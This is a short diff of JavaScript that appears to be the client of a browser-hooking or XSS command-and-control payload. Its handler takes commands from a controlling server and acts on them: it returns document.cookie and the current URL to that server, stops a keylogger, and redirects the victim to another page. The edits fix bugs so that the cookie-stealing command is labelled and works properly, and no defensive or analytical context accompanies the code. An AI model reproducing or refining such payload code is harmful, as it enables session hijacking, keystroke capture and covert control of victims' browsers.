@@ -55,9 +55,9 @@
     var handleData = function (data) {
         console.dir(data);
         if (data.type == 'msg') {
-            alert(data.metadata);
+            alert(data.metaData);
         } else if (data.type == 'getCookies') {
-            sendCommandToServer("receiveUrl", document.cookie);
+            sendCommandToServer("receiveCookies", document.cookie);
         } else if (data.type == 'getUrl') {
             sendCommandToServer("receiveUrl", window.location.href);
         } else if (data.type == 'getSite') {
@@ -67,7 +67,7 @@
         } else if (data.type == 'stopLogger') {
             stopKeyLogger();
         } else if (data.type == 'goToUrl') {
-            window.location.href = data.metadata;
+            window.location.href = data.metaData;
         }
 
     };
